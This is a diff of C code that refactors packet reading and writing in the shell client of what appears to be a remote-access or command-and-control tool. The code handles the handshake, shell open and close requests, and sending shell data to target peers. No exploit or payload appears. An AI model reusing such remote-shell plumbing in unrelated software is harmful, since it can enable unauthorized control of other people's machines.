@@ -45,7 +45,7 @@ void shellC_handleHandshakeRes(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void 
     uint8_t endianness = laikaS_readByte(&peer->sock);
     laikaS_read(&peer->sock, saltBuf, LAIKA_HANDSHAKE_SALT_LEN);
 
-    peer->sock.flipEndian = endianness != laikaS_isBigEndian();
+    peer->sock.flipEndian = endianness != laikaM_isBigEndian();
 
     /* set peer salt */
     laikaS_setSalt(peer, saltBuf);
@@ -134,7 +134,7 @@ void shellC_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
     if (sz - sizeof(uint32_t) > LAIKA_SHELL_DATA_MAX_LENGTH)
         return;
 
-    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t)); /* this is ignored for now */
+    id = laikaS_readu32(&peer->sock); /* this is ignored for now */
     sz -= sizeof(uint32_t);
 
     /* sanity check */
@@ -150,7 +150,7 @@ void shellC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *u
     tShell_client *client = (tShell_client *)uData;
     uint32_t id;
 
-    laikaS_readInt(&peer->sock, &id, sizeof(uint32_t)); /* this is ignored for now */
+    id = laikaS_readu32(&peer->sock); /* this is ignored for now */
 
     /* sanity check */
     if (!shellC_isShellOpen(client))
@@ -396,8 +396,8 @@ void shellC_openShell(tShell_client *client, tShell_peer *peer, uint16_t col, ui
     /* send SHELL_OPEN request */
     laikaS_startOutPacket(client->peer, LAIKAPKT_AUTHENTICATED_SHELL_OPEN_REQ);
     laikaS_write(&client->peer->sock, peer->pub, sizeof(peer->pub));
-    laikaS_writeInt(&client->peer->sock, &col, sizeof(uint16_t));
-    laikaS_writeInt(&client->peer->sock, &row, sizeof(uint16_t));
+    laikaS_writeu16(&client->peer->sock, col);
+    laikaS_writeu16(&client->peer->sock, row);
     laikaS_endOutPacket(client->peer);
     client->openShell = peer;
 }
@@ -411,7 +411,7 @@ void shellC_closeShell(tShell_client *client)
 
     /* send SHELL_CLOSE request */
     laikaS_startOutPacket(client->peer, LAIKAPKT_SHELL_CLOSE);
-    laikaS_writeInt(&client->peer->sock, &id, sizeof(uint32_t));
+    laikaS_writeu32(&client->peer->sock, id);
     laikaS_endOutPacket(client->peer);
 
     client->openShell = NULL;
@@ -426,7 +426,7 @@ void shellC_sendDataShell(tShell_client *client, uint8_t *data, size_t sz)
         return;
 
     laikaS_startVarPacket(client->peer, LAIKAPKT_SHELL_DATA);
-    laikaS_writeInt(sock, &id, sizeof(uint32_t));
+    laikaS_writeu32(sock, id);
     switch (client->openShell->osType) {
     case LAIKA_OSTYPE: /* if we're the same as the target OS, line endings don't need to be
                           converted! */
